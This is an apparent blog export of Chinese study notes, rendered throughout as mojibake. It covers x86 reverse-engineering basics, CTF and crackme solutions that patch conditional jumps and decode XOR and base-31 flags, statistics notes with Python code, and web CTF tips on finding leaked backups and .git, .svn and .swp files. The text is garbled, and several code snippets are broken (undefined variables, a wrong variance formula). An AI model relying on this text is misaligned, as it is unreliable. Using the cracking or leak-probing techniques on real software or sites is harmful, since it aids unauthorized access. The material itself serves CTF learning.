‡å¿—å™¨ï¼Œè¿ç®—ç»“æœä¸º0æ—¶ç½®1) CF(è¿›ä½æ ‡å¿—ï¼Œè¿ç®—ç»“æœå‘æœ€é«˜ä½ä»¥ä¸Šè¿›ä½æ—¶ç½®1) OF(æº¢å‡ºæ ‡å¿—) AF(è¾…åŠ©è¿›ä½æ ‡å¿—ï¼Œè¿ç®—ç»“æœåœ¨ç¬¬3ä½çš„æ—¶å€™ç½®1) SF(ç¬¦å·æ ‡å¿—ï¼Œæœ‰ç¬¦å·æ•´å‹çš„ç¬¦å·ä½ä¸º1æ—¶ç½®1) æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ EIP / RIPï¼šä¿å­˜CPUè¦æ‰§è¡Œçš„æŒ‡ä»¤åœ°å€ å¸¸ç”¨æŒ‡ä»¤ æ“ä½œç  ç›®çš„æ“ä½œæ•° æºæ“ä½œæ•°\nPUSH/POPï¼šå‹æ ˆ/å‡ºæ ˆ PUSHA/POPA ã€ PUSHAD/POPAD MOV/CALL/RET/LEA/INT/EMDï¼šä¼ é€ / è°ƒç”¨ / è¿”å› / åŠ è½½ / ä¸­æ–­ / ç»“æŸ CMP/TESTï¼šæ¯”è¾ƒ/æµ‹è¯•ï¼ˆç»“æœä¸¢å¼ƒï¼Œåªä¿®æ”¹æ ‡å¿—ä½å¯„å­˜å™¨ï¼‰ JMPç³»åˆ—è·³è½¬æŒ‡ä»¤ ADD/SUB/SHL/SHR/ROL/RORï¼šåŠ  / å‡ / é€»è¾‘å·¦ç§» / é€»è¾‘å³ç§» / å¾ªç¯å·¦ç§» / å¾ªç¯å³ç§» INC/DEC ï¼šåŠ ä¸€ / å‡ä¸€ MUL/IMULï¼šæ— ç¬¦å·ä¹˜æ³•ã€æ•´æ•°ä¹˜æ³• DIV/IDIVï¼šæ— ç¬¦å·é™¤æ³•ã€æ•´æ•°é™¤æ³• AND/XOR/OR/NOTï¼šä¸ / å¼‚æˆ– / æˆ– / å–å æ ˆå¸§ 1 2 3 4 5 6 7 8 PUSH EBP ;å‡½æ•°å¼€å§‹ MOV EBP,ESP ;å°†æ ˆé¡¶åœ°å€å­˜å…¥EBPä¸­ .... ;å‡½æ•°æ‰§è¡Œï¼ŒæœŸé—´EBPåœ°å€ä¸å˜ MOV ESP,EBP ;åŸºå‡†ç‚¹åœ°å€ç»™åˆ°ESP POP EBP ;æ ˆçŠ¶æ€æ¢å¤ï¼Œå¼¹å‡ºEBP RETN ;å‡½ IDAå¸¸ç”¨è„šæœ¬ IDC\u0026amp;pythonï¼Œå…·ä½“å¯ä»¥çœ‹IDAçš„å®˜æ–¹ä¹¦ç±\nIDC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //è·å–å¯„å­˜å™¨çš„å€¼ auto eax = GetRegValue(\u0026#34;EAX\u0026#34;); auto addr = 0x0; auto i = 0; for(i; i \u0026lt; 10; i = i+1) { //æ‰“å°å­—èŠ‚ Message(\u0026#34;%x\u0026#34;,Byte(addr+i)); //ä¿®æ”¹å­—èŠ‚ PatchByte(addr+i,Byte()); } //dumpæ•°æ® auto i,fp; fp = fopen(\u0026#34;D:\\\\dump2\u0026#34;,\u0026#34;wb\u0026#34;); for(i=0x10;i\u0026lt;0x12;i++) fputc(Byte(i),fp); print(\u0026#34;end\u0026#34;); python 1 2 3 4 5 6 7 8 # å¯¼å…¥å¤´æ–‡ä»¶ from idaapi import * # è·å–å¯„å­˜å™¨çš„å€¼ espval = get_reg_val(\u0026#39;esp\u0026#39;) # è·å–å­—èŠ‚å€¼ida_bytes.get_word() value = ida_bytes.get_word(address) # è·å–16å­—èŠ‚é•¿åº¦çš„æ•°æ® ida_bytes.get_bytes(address, 16) easyåŠ¨æ€è°ƒè¯• æ€è·¯ï¼šæŠŠä¸åœ¨ä¸»å‡½æ•°é‡Œé¢çš„å‡½æ•°è¿è¡Œä¸‹å°±è¡Œ\nEIPä¿®æ”¹ä¸º_queså‡½æ•°çš„åœ°å€F9è¿è¡Œå°±è¡Œï¼Œæ‹¿åˆ°Flag\nez_xor ä¸‹é¢æ˜¯XORçš„encodeå‡½æ•°\nä¸€å¼€å§‹æƒ³äº†ä¸‹a2æ˜¯ä»€ä¹ˆï¼Œå‘ç°å°±æ˜¯ä¼ å‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char const *argv[]) { char flag1[] = \u0026#34;E`}J]OrQF[V8zV:hzpV}fVF[t\u0026#34;; char flag[] = \u0026#34;\u0026#34;; for (int i = 0; i \u0026lt; strlen(flag1); i++) { flag1[i] ^= 3 * 3; printf(\u0026#34;%s\\n\u0026#34;, flag1); } } å¥½æ— èŠå•Šï¼Œæƒ³åšPWNé¢˜äº†\nXOR è¿™é“é¢˜ä¸»è¦æ˜¯arrayè¦çœ‹æ‡‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;stdlib.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main(int argc, char const *argv[]) { int flag1[] = {0x3FE, 0x3EB, 0x3EB, 0x3FB, 0x3E4, 0x3F6, 0x3D3, 0x3D0, 0x388, 0x3CA, 0x3EF, 0x389, 0x3CB, 0x3EF, 0x3CB, 0x388, 0x3EF, 0x3D5, 0x3D9, 0x3CB, 0x3D1, 0x3CD}; char flag[] = {}; for (int i = 0; i \u0026lt; 21; i++) { â€‹ flag[i] = (flag1[i] - 900) ^ 0x34; â€‹ printf(\u0026#34;%c\u0026#34;, flag[i]); } return 0; } CrakeMEV3 æ„æ€æ˜¯è¦è¯»å–ä¸€ä¸ªåŒç›®å½•ä¸‹åä¸ºCRACJME3.KEYçš„æ–‡ä»¶ï¼Œè¯•è¿‡å¦‚æœæ–‡ä»¶åä¸å«è¿™ä¸ªï¼Œè°ƒè¯•æš‚åœ\nçœ‹åˆ°å†™åœ¨CRACKME3.KEYçš„å­—ç¬¦ï¼Œæ­¥è¿›æŸ¥çœ‹å‡½æ•°\nabexcrakeme3 æ€è·¯ï¼šè¦æ‰¾ä¸€æœ¬abex.l2cæ–‡ä»¶ï¼Œé‚£å°±è‡ªå·±åˆ›å»ºä¸€ä¸ªï¼Œä¸‹é¢è¿˜æœ‰ä¸¤ä¸ªæ¯”è¾ƒè·³è½¬ï¼Œç›´æ¥çˆ†ç ´ï¼ŒæŠŠä¸¤ä¸ªjne nopæ‰ï¼Œç§’äº†\ncosh1.exe ç¬¬ä¸€ä¸ªçˆ†ç ´ç‚¹ï¼šæŠŠjzæ¢æˆjmpï¼Œå¼ºåˆ¶è·³è½¬ï¼Œä¸ç”¨çœ‹æ¡ä»¶\nç»§ç»­æ‰¾ï¼Œåœ¨å‡½æ•°å¤´ä¸‹æ–­ç‚¹ï¼Œç”±äºç¨‹åºå·²ç»è¿è¡Œï¼Œç›´æ¥æŒ‰check for CD\nç®—æ³•ï¼šå°±æ˜¯åœ¨å„ç§å…‰é©±é‡Œé¢å¾ªç¯æŸ¥æ‰¾ï¼Œæ‰¾æœ‰æ²¡CD_CHECK.DATçš„æ–‡ä»¶\nAcid_burn ç¬¬ä¸€ä¸ªserial incorrect jgeæ”¹æˆjmp\nç¬¬äºŒä¸ªserial jnzç»™nopæ‰\nç§’äº†\nç®—æ³•åˆ†æï¼šçœ‹å³ä¸Šè§’å¯„å­˜å™¨ï¼Œè‡ªå·±è¾“å…¥1234æ”¾åœ¨å¯„å­˜å™¨EDXä¸­ï¼ŒEAXæ˜¯ä¸€æ®µå­—ç¬¦ä¸²ï¼ŒçŒœæµ‹æ˜æ–‡æ˜¯\u0026quot;CW-4018-CRACKED\u0026quot;\næ‹–åˆ°IDAä¸­åˆ†æï¼Œæ‰¾CRACKEDæ‰€åœ¨çš„å‡½æ•°ï¼Œå·®ä¸å¤šå°±æ˜¯ä¸‹é¢ä¸€æ®µ\n1 2 3 4 5 6 7 8 9 void Decryption(char* mima) { char szBuff[260]; unsigned long data = (unsigned long)mima[0]; data *= 0X29; data *= 2; sprintf(szBuff, \u0026#34;CW-%d-CRACKED\u0026#34;, data); printf(\u0026#34;%s \\r\\n\u0026#34;, szBuff); } fakebase 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 flag = \u0026#39;xxxxxxxxxxxxxxxxxxx\u0026#39; s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; tmp = \u0026#39;\u0026#39; for i in flag: tmp += str(bin(ord(i)))[2:].zfill(8) # å°†æ¯ä¸ªå­—ç¬¦è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¹¶å¡«å……åˆ° 8 ä½ b1 = int(tmp,2) # å°†æ‹¼æ¥åçš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºåè¿›åˆ¶æ•´æ•° s = \u0026#39;\u0026#39; while b1//31 != 0: s += s_box[b1%31]# å°†ä½™æ•°æ˜ å°„åˆ° s_box ä¸­çš„å­—ç¬¦ï¼Œå¹¶æ‹¼æ¥åˆ° s ä¸­ b1 = b1//31 print(s) \\# s = u#k4ggia61egegzjuqz12jhfspfkay åŠ¨æ€è°ƒè¯•crackme ç»åˆ†æï¼Œstring1å’Œstring2çš„å­ä¸²æ¯”å¯¹ï¼Œè¿›è€Œè¾“å‡ºåˆ¤æ–­ç»“æœï¼Œåœ¨åˆ¤æ–­ç»“æŸçš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼ŒExitProcess(0)\nXDBGè°ƒè¯•\nè¦æ±‚Nameè¾“å…¥crackme\nä¸€æ­¥æ­¥ç›´åˆ°å‡ºç°This serial sucksï¼Œå›è¿‡å»çœ‹çœ‹å’Œé‚£ä¸ªå­—æ®µåšäº†æ¯”è¾ƒï¼Œè¦æ¯”è¾ƒçš„å­—æ®µå°±æ˜¯æ­£ç¡®çš„serial\nä¸€èˆ¬åœ¨strampä¸‹æ–­ç‚¹\nQA:ä¸ºä»€ä¹ˆåœ¨ç¨‹åºå¤±è´¥è¿”å›æ‰èƒ½å‡ºç°æ­£ç¡®çš„åºåˆ—å·\n[SWPUCTF 2021 æ–°ç”Ÿèµ›]fakebase 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 flag = \u0026#39;xxxxxxxxxxxxxxxxxxx\u0026#39; s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; tmp = \u0026#39;\u0026#39; for i in flag: tmp += str(bin(ord(i)))[2:].zfill(8) b1 = int(tmp,2) s = \u0026#39;\u0026#39; while b1//31 != 0: s += s_box[b1%31] b1 = b1//31 print(s) \\# s = u#k4ggia61egegzjuqz12jhfspfkay å°†flagä¸­æ¯ä¸ªå­—ç¬¦å½±å°„ä¸ºå­—ç¬¦é›†çš„code point, è½¬æ¢ä¸ºäºŒè¿›åˆ¶, å†è½¬æ¢ä¸ºåè¿›åˆ¶, å†è½¬æ¢ä¸ºæœ€ä½ä½åœ¨å‰çš„31è¿›åˆ¶,\nå…ˆæŠŠsé€†å›å»\n1 2 3 4 5 6 7 8 9 import libnum s=\u0026#34;u#k4ggia61egegzjuqz12jhfspfkay\u0026#34;[::-1] s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; print(s) for i in range(5): key = i for j in range((len(s))): key = key *31 + s_box.index(s[j]) print(libnum.n2s(int(key))) çœ‹ç€ç­”æ¡ˆï¼Œæƒ³èµ·å¤§ä¸€é«˜ä»£å­¦çš„è¾—è½¬ç›¸é™¤ï¼Œå°±æ˜¯æ¬§å‡ é‡Œå¾—ç®—æ³•\næ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•å¯ç”¨äºRSAåŠ å¯†ç­‰é¢†åŸŸã€‚\nå‡å¦‚éœ€è¦æ±‚ 1997 å’Œ 615 ä¸¤ä¸ªæ­£æ•´æ•°çš„æœ€å¤§å…¬çº¦æ•°,ç”¨æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼Œæ˜¯è¿™æ ·è¿›è¡Œçš„ï¼š\n1997 Ã· 615 = 3 (ä½™ 152)\n615 Ã· 152 = 4(ä½™7)\n152 Ã· 7 = 21(ä½™5)\n7 Ã· 5 = 1 (ä½™2)\n5 Ã· 2 = 2 (ä½™1)\n2 Ã· 1 = 2 (ä½™0)\nè‡³æ­¤ï¼Œæœ€å¤§å…¬çº¦æ•°ä¸º1\nä»¥é™¤æ•°å’Œä½™æ•°åå¤åšé™¤æ³•è¿ç®—ï¼Œå½“ä½™æ•°ä¸º 0 æ—¶ï¼Œå–å½“å‰ç®—å¼é™¤æ•°ä¸ºæœ€å¤§å…¬çº¦æ•°ï¼Œæ‰€ä»¥å°±å¾—å‡ºäº† 1997 å’Œ 615 çš„æœ€å¤§å…¬çº¦æ•° 1ã€‚\nè¯æ³•ä¸€ aå¯ä»¥è¡¨ç¤ºæˆa = kb + rï¼ˆaï¼Œbï¼Œkï¼Œrçš†ä¸ºæ­£æ•´æ•°ï¼Œä¸”rä¸ä¸º0ï¼‰\nå‡è®¾dæ˜¯a,bçš„ä¸€ä¸ªå…¬çº¦æ•°ï¼Œè®°ä½œd|a,d|bï¼Œå³aå’Œbéƒ½å¯ä»¥è¢«dæ•´é™¤ã€‚\nè€Œr = a - kbï¼Œä¸¤è¾¹åŒæ—¶é™¤ä»¥dï¼Œr/d=a/d-kb/dï¼Œç”±ç­‰å¼å³è¾¹å¯çŸ¥m=r/dä¸ºæ•´æ•°ï¼Œå› æ­¤d|r\nå› æ­¤dä¹Ÿæ˜¯b,a mod bçš„å…¬çº¦æ•°ã€‚\nå› (a,b)å’Œ(b,a mod b)çš„å…¬çº¦æ•°ç›¸ç­‰ï¼Œåˆ™å…¶æœ€å¤§å…¬çº¦æ•°ä¹Ÿç›¸ç­‰ï¼Œå¾—è¯ã€‚\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E9%80%86%E5%90%91%E5%B0%8F%E7%99%BD/","title":"é€†å‘å°ç™½"},{"content":"æ€»ä½“ï¼šX\nä¸ªä½“ï¼šXi\næ ·æœ¬ï¼š(X1ï¼ŒX2ï¼Œ\u0026hellip;\u0026hellip;.Xn)éšæœºå˜é‡\næ ·æœ¬å€¼ï¼šnä¸ªç‹¬ç«‹æ ·æœ¬çš„ä¸€æ¬¡å®ç°(x1,x2,\u0026hellip;\u0026hellip;.xn)å…·ä½“çš„æ•°\néšæœºæŠ½æ ·ï¼šæ— æ”¾å›ï¼šè¿‘ä¼¼ç‹¬ç«‹åŒåˆ†å¸ƒï¼Œn/N\u0026lt;1,æ”¾å›:ç‹¬ç«‹åˆ†å¸ƒ\n$$ proof: $$ åˆ†å±‚æŠ½æ ·ï¼šä¸ç‹¬ç«‹\nåˆ†ç¾¤æŠ½æ ·\néå‚æ•°ç»Ÿè®¡ï¼Œéå‚æ•°ä¼°è®¡ï¼Œæ ¸å¯†åº¦ä¼°è®¡ï¼Œéå‚æ•°å‡è®¾æ£€éªŒ\néå‚æ•°ç»Ÿè®¡æ–¹æ³•æ— éœ€å‡å®šæ€»ä½“åˆ†å¸ƒï¼Œå¯ä»¥é€šè¿‡æ ·æœ¬ä¿¡æ¯æ¥æ¨æ–­æ€»ä½“ï¼Œè€Œå‚æ•°ç»Ÿè®¡åˆ™éœ€è¦å·²çŸ¥æˆ–å‡å®šæ€»ä½“åˆ†å¸ƒã€‚å› æ­¤è¾ƒå‚æ•°ç»Ÿè®¡ï¼ˆå³ä¸€èˆ¬æ„ä¹‰ä¸‹çš„æ•°ç†ç»Ÿè®¡ï¼‰ï¼Œéå‚æ•°ç»Ÿè®¡é€‚ç”¨é¢æ›´å¹¿ã€‚ä½†éå‚æ•°ç»Ÿè®¡æ¨æ–­çš„å‡†ç¡®åº¦è¾ƒä½ã€‚åº”æ³¨æ„çš„æ˜¯éå‚æ•°ç»Ÿè®¡åªæ˜¯ä¸ä¾èµ–æ€»ä½“åˆ†å¸ƒï¼Œä½†æœ‰äº›ç»Ÿè®¡é‡çš„ä¿¡æ¯è¿˜æ˜¯éœ€è¦çŸ¥é“ï¼Œå¹¶ä¸”ç ”ç©¶çš„å¯¹è±¡ä¾æ—§æ˜¯åæ˜ æ€»ä½“ç‰¹å¾çš„ç»Ÿè®¡é‡ã€‚\næè¿°æ ·æœ¬çš„ä¸­å¿ƒåŒ–è¶‹åŠ¿ å‡å€¼ï¼Œå¯èƒ½ä¼šå¸¦æ¥å¤±å¸§\nä¸­ä½æ•°ï¼Œæ ·æœ¬ä»å°åˆ°å¤§æ’åºçš„æ¬¡åºç»Ÿè®¡é‡çš„ä¸­é—´å€¼\nä¼—æ•°\nå˜é‡çš„åº¦é‡ ä¸ºä»€ä¹ˆè®¡ç®—æ ·æœ¬æ–¹å·®åˆ†æ¯æ˜¯n-1?\næå·®ï¼Œæ€»ä½“/æ ·æœ¬æ–¹å·®ï¼Œæ ‡å‡†å·®\nåˆ†ä½æ•° ç™¾åˆ†ä½æ•°ï¼Œè®¡ç®—i=n*(p/100) è‹¥iä¸ºæ•´æ•°ï¼Œq(p)=(x[i]+x[i+1])/2\nè‹¥iä¸ä¸ºæ•´æ•°q(p)=x[i]+1\nå››åˆ†ä½æ•° Box-Whiskerå›¾ ç®±çº¿å›¾æ˜¯ä¸€ç§åŸºäºäº”ä¸ªæ•°å­—æ‘˜è¦æ˜¾ç¤ºæ•°æ®é›†çš„æ ‡å‡†åŒ–æ–¹å¼ï¼šæœ€å°å€¼ã€æœ€å¤§å€¼ã€æ ·æœ¬ä¸­ä½æ•°ä»¥åŠç¬¬ä¸€å’Œç¬¬ä¸‰ä¸ªå››åˆ†ä½æ•°ã€‚\nMinimum (*Q*0 or 0th percentile): the lowest data point in the data set excluding any outliers **æœ€å°å€¼ï¼ˆ*Q*0 æˆ–ç¬¬ 0 ä¸ªç™¾åˆ†ä½æ•°ï¼‰ï¼š**æ•°æ®é›†ä¸­ä¸åŒ…æ‹¬ä»»ä½•å¼‚å¸¸å€¼çš„æœ€ä½æ•°æ®ç‚¹ Maximum (*Q*4 or 100th percentile): the highest data point in the data set excluding any outliers **æœ€å¤§å€¼ï¼ˆ*Q*4 æˆ–ç¬¬ 100 ä¸ªç™¾åˆ†ä½æ•°ï¼‰ï¼š**æ•°æ®é›†ä¸­ä¸åŒ…æ‹¬ä»»ä½•å¼‚å¸¸å€¼çš„æœ€é«˜æ•°æ®ç‚¹ Median (*Q*2 or 50th percentile): the middle value in the data set **ä¸­ä½æ•°ï¼ˆ*Q*2 æˆ–ç¬¬ 50 ä¸ªç™¾åˆ†ä½æ•°ï¼‰ï¼š**æ•°æ®é›†ä¸­çš„ä¸­é—´å€¼ First quartile (*Q*1 or 25th percentile): also known as the lower quartile q**n(0.25), it is the median of the lower half of the dataset. ç¬¬ä¸€å››åˆ†ä½æ•°ï¼ˆ*Q*1 æˆ–ç¬¬ 25 ä¸ªç™¾åˆ†ä½æ•°ï¼‰ï¼šä¹Ÿç§°ä¸º*ä¸‹å››åˆ†ä½æ•°qn*ï¼ˆ0.25ï¼‰ï¼Œå®ƒæ˜¯æ•°æ®é›†ä¸‹åŠéƒ¨åˆ†çš„ä¸­ä½æ•°ã€‚ Third quartile (*Q*3 or 75th percentile): also known as the upper quartile q**n(0.75), it is the median of the upper half of the dataset.[7] ç¬¬ä¸‰ä¸ªå››åˆ†ä½æ•°ï¼ˆ*Q*3 æˆ–ç¬¬ 75 ä¸ªç™¾åˆ†ä½æ•°ï¼‰ï¼šä¹Ÿç§°ä¸º*ä¸Šå››åˆ†ä½æ•°qn*ï¼ˆ0.75ï¼‰ï¼Œå®ƒæ˜¯æ•°æ®é›†ä¸ŠåŠéƒ¨åˆ†çš„ä¸­ä½æ•°ã€‚[7] æ•°æ®åˆ†ææ¨æ–­å‰æœŸï¼šå¯è§†åŒ–ï¼\næ ·æœ¬æ–¹å·® 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 def calculate_mean(numbers): s=sum(numbers) N=len(numbers) #calculate the mean mean = s/N return mean def find_diff(numbers): #find the mean mean=calculate_mean(numbers) diff=[] for i in numbers: diff.append(num-mean) return diff def calculate_variance(numbers): diff = find_diff(numbers) squ=[] for i in diff: squ.append(i**2) variance=sum(squ)/N-1 return variance æ ·æœ¬çŸ© ak\nbk\næ ·æœ¬ååº¦\næ ·æœ¬èœ‚åº¦\næœ‰æ— ä¸­å¿ƒå¯¹ç§°ï¼Œå·¦åorå³ååˆ†å¸ƒï¼Ÿçœ‹å°¾å·´åœ¨å“ªä¸€ä¾§\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def calculate_ak(numbers,k): N=len(numbers) ak=[] for i in numbers: ak.append(i**k) return ak def calculate_bk(numbers,k): N=len(numbers) bk=[] find_diff=0 mean=calculate_mean(numbers) for i in numbers: find_diff+=((i-mean)**k) return find_diff/N def yangben_piandu(numbers): return calculate_bk(numbers,3)/(calculate_bk(numbers,2)**1.5) def yangben_fengdu(numbers): return (calculate_bk(numbers,4)/(calculate_bk(numbers,2)**2)) -3 æ¬¡åºç»Ÿè®¡é‡ 1 2 3 4 5 6 7 def order_statistics(numbers): if k\u0026lt;1 or k\u0026gt;len(numbers): return ValueError(\u0026#34;\u0026#34;) else: sorted_numbers=sorted(numbers) return sorted_numbers è®¾æ€»ä½“X~U(0,1),åˆ™ç¬¬kä¸ªæ¬¡åºç»Ÿè®¡é‡çš„å¯†åº¦å‡½æ•°\næ ·æœ¬påˆ†ä½æ•° 1 2 3 4 5 6 7 8 9 10 def is_integer(n,p)ï¼š return isinstance(n*p,int) def calculate_p(numbers,n,p): N=len(numbers) numbers.sort() if is_integer: return numbers[n*p+1] else: return (numbers[n*p]+numbers[n*p+1])/2 ä¸‰å¤§æŠ½æ ·åˆ†å¸ƒ ç»Ÿè®¡é‡çš„æ„é€  1 2 3 4 5 6 7 8 9 10 11 12 13 def fenbu1(numbers): k2=0 for i in len(numbers): k2 += numbers[i]**2 return k2 def fenbu2(numbers1,numbers2): F=0 N1=len(numbers1) N2=len(numbers2) a=fenbu1(numbers1)/N1 b=fenbu2(numbers2)/N2 F=a/b return F ","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/","title":"æ•°ç†ç»Ÿè®¡"},{"content":"web2ï¼šview-sourceæ˜¯ä¸€ç§åè®®ï¼Œæ—©æœŸåŸºæœ¬ä¸Šæ¯ä¸ªæµè§ˆå™¨éƒ½æ”¯æŒè¿™ä¸ªåè®®ã€‚åæ¥Microsoftè€ƒè™‘å®‰å…¨æ€§ï¼Œå¯¹äºWindowsXP pack2ä»¥åŠæ›´é«˜ç‰ˆæœ¬ä»¥åIEå°±ä¸å†æ”¯æŒæ­¤åè®®ã€‚ä½†æ˜¯è¿™ä¸ªæ–¹æ³•åœ¨FireFoxå’ŒChromeæµè§ˆå™¨éƒ½è¿˜å¯ä»¥ä½¿ç”¨ã€‚ å¦‚æœè¦åœ¨IEä¸‹æŸ¥çœ‹æºä»£ç ,åªèƒ½ä½¿ç”¨æŸ¥çœ‹ä¸­çš„\u0026quot;æŸ¥çœ‹æºä»£ç \u0026quot;å‘½ä»¤.ä»¥å‰çš„ä½¿ç”¨æ–¹æ³•ï¼šåœ¨æµè§ˆå™¨åœ°å€æ ä¸­è¾“å…¥ view-source: URL\nweb3:æ‰“å¼€burp suiteç„¶ååœ¨ä»ªè¡¨ç›˜é€‰æ‹©æ–°æ‰«æè¾“å…¥urlï¼ˆç½‘å€ï¼‰åç‚¹å‡»ç¡®å®šï¼Œç„¶åç‚¹å‡»ç›®æ ‡ï¼Œé€‰æ‹©ç›¸åº”\u0026ndash;rawå°±å¯ä»¥çœ‹è§flagäº†or F12 \u0026mdash;\u0026gt;é€‰æ‹©ç½‘ç»œ\u0026mdash;\u0026gt;F5åˆ·æ–°é¡µé¢ï¼ŒæŸ¥çœ‹å“åº”å¤´ã€‚\nweb4ï¼šrobots.txtï¼ˆçˆ¬è™«åè®®ï¼‰\nweb5ï¼šç›®å½•æ‰«æï¼šindex.phps(phpæ–‡ä»¶)\nphpsæ–‡ä»¶æ³„éœ²ï¼Œphpså­˜æ”¾ç€phpæºç ,å¯é€šè¿‡å°è¯•è®¿é—®/index.phpsè¯»å–,æˆ–è€…å°è¯•æ‰«æå·¥å…·æ‰«æè¯»å–.\nweb6ï¼šurl/www.zipç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶ æ¼æ´æˆå› \nåœ¨ç½‘ç«™çš„å‡çº§å’Œç»´æŠ¤è¿‡ç¨‹ä¸­ï¼Œé€šå¸¸éœ€è¦å¯¹ç½‘ç«™ä¸­çš„æ–‡ä»¶è¿›è¡Œä¿®æ”¹ã€‚æ­¤æ—¶å°±éœ€è¦å¯¹ç½‘ç«™æ•´ç«™æˆ–è€…å…¶ä¸­æŸä¸€é¡µé¢è¿›è¡Œå¤‡ä»½ã€‚\nå½“å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¿®æ”¹è¿‡ç¨‹ä¸­çš„ç¼“å­˜æ–‡ä»¶å› ä¸ºå„ç§åŸå› è€Œè¢«ç•™åœ¨ç½‘ç«™ web ç›®å½•ä¸‹ï¼Œè€Œè¯¥ç›®å½•åˆæ²¡æœ‰è®¾ç½®è®¿é—®æƒé™æ—¶ï¼Œä¾¿æœ‰å¯èƒ½å¯¼è‡´å¤‡ä»½æ–‡ä»¶æˆ–è€…ç¼–è¾‘å™¨çš„ç¼“å­˜æ–‡ä»¶è¢«ä¸‹è½½ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œç»™æœåŠ¡å™¨çš„å®‰å…¨åŸ‹ä¸‹éšæ‚£ã€‚\nè¯¥æ¼æ´çš„æˆå› ä¸»è¦æœ‰æ˜¯ç®¡ç†å‘˜å°†å¤‡ä»½æ–‡ä»¶æ”¾åœ¨åˆ° web æœåŠ¡å™¨å¯ä»¥è®¿é—®çš„ç›®å½•ä¸‹ã€‚\nè¯¥æ¼æ´å¾€å¾€ä¼šå¯¼è‡´æœåŠ¡å™¨æ•´ç«™æºä»£ç æˆ–è€…éƒ¨åˆ†é¡µé¢çš„æºä»£ç è¢«ä¸‹è½½ï¼Œåˆ©ç”¨ã€‚æºä»£ç ä¸­æ‰€åŒ…å«çš„å„ç±»æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚æœåŠ¡å™¨æ•°æ®åº“è¿æ¥ä¿¡æ¯ï¼ŒæœåŠ¡å™¨é…ç½®ä¿¡æ¯ç­‰ä¼šå› æ­¤è€Œæ³„éœ²ï¼Œé€ æˆå·¨å¤§çš„æŸå¤±ã€‚\nè¢«æ³„éœ²çš„æºä»£ç è¿˜å¯èƒ½ä¼šè¢«ç”¨äºä»£ç å®¡è®¡ï¼Œè¿›ä¸€æ­¥åˆ©ç”¨è€Œå¯¹æ•´ä¸ªç³»ç»Ÿçš„å®‰å…¨åŸ‹ä¸‹éšæ‚£ã€‚\n.rar .zip .7z .tar.gz .bak .swp .txt\næºç æ³„éœ² url/www.zip å¾—çŸ¥éšè—ç›®å½•/fl000g.txt\nweb7: dirsearch -u url å‘ç°ç›®å½• /.git\nweb8 /.svn ä»£ç ç‰ˆæœ¬ç®¡ç†å·¥å…·\nweb9: æœ¬é¢˜ç›®çš„æ˜¯è®©ç­”é¢˜è€…äº†è§£åˆ°vimç¼–è¾‘å™¨ä½¿ç”¨æ—¶ä¼šæœ‰ä¸€ä¸ªç¼“å­˜æ–‡ä»¶ï¼Œè¿™ä¸ªç¼“å­˜æ–‡ä»¶åœ¨ä¿å­˜æ—¶è¿›è¡Œåˆ é™¤ï¼Œä½†æ˜¯åœ¨vimæ„å¤–é€€å‡ºæ—¶è¿™ä¸ªç¼“å­˜æ–‡ä»¶ï¼Œä¼šä»¥æºæ–‡ä»¶åŠ ä¸€ä¸ª.swpåç¼€è¿›è¡Œä¿å­˜ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è®¿é—®è¿™äº›æ–‡ä»¶æ¥å°è¯•è·å–ä¸€äº›æ–‡ä»¶ã€‚\n/index.php.swp\nweb10:network cookie\næœ¬é¢˜ç›®æ˜¯è®©ç­”é¢˜è€…äº†è§£åˆ°cookieï¼Œcookieä¸€èˆ¬ç”¨äºåœ¨èº«ä»½è®¤è¯çš„è¿‡ç¨‹ä¸­ä¿å­˜ä¸€äº›ä¿¡æ¯ï¼Œç”¨äºæœåŠ¡å™¨æ¥éªŒè¯èº«ä»½,åœ¨æµ‹è¯•ä¸­å¯ä»¥å°è¯•æ³¨å…¥ç­‰æ–¹å¼ã€‚å¯ä»¥ä½¿ç”¨burp/F12ä¸­çš„ç½‘ç»œæ¥æŸ¥çœ‹\nweb11:dnsæŸ¥æ‰¾åŸŸå\nweb12:æŸ¥çœ‹robots.txtæ–‡ä»¶ï¼Œç”¨æˆ·åadminã€‚å¯†ç ï¼šåœ¨é¡µé¢çš„æœ€ä¸‹æ–¹ ç®¡ç†å‘˜ç•Œé¢ï¼š/admin\nweb13:/document.pdfï¼Œåº•éƒ¨ä¿¡æ¯\næœ¬é¢˜ç›®çš„æ˜¯ç­”é¢˜è€…äº†è§£åˆ°å¾ˆå¤šçš„æ–‡ç« 